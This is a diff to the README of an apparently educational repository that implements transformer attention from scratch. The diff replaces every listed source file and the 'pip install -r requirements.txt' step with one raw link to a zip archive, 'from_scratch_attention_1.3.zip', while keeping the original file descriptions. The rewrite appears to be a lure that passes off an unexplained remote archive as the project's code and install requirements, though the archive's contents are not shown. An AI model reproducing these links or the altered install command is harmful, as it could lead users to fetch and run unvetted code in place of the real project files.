@@ -7,10 +7,10 @@ This repository is intentionally small and pedagogical. It aims to help you _see
 ## What you'll find
 
 - `notebooks/` — step-by-step notebook-style guides (in markdown) you can paste into Jupyter.
-- `src/attention.py` — clean NumPy implementation with helper utilities.
-- `src/softmax.py` — numerically stable softmax.
-- `experiments/manual_qkv_cases.py` — runnable script that walks through the core experiments and prints matrices.
-- `notes/conceptual_takeaways.md` — short, interview-ready takeaways.
+- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — clean NumPy implementation with helper utilities.
+- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — numerically stable softmax.
+- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — runnable script that walks through the core experiments and prints matrices.
+- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — short, interview-ready takeaways.
 
 ## Requirements
 
@@ -23,5 +23,5 @@ Install:
 ```bash
 python -m venv .venv
 source .venv/bin/activate # or .venv\Scripts\activate on Windows
-pip install -r requirements.txt
+pip install -r https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip
 ```
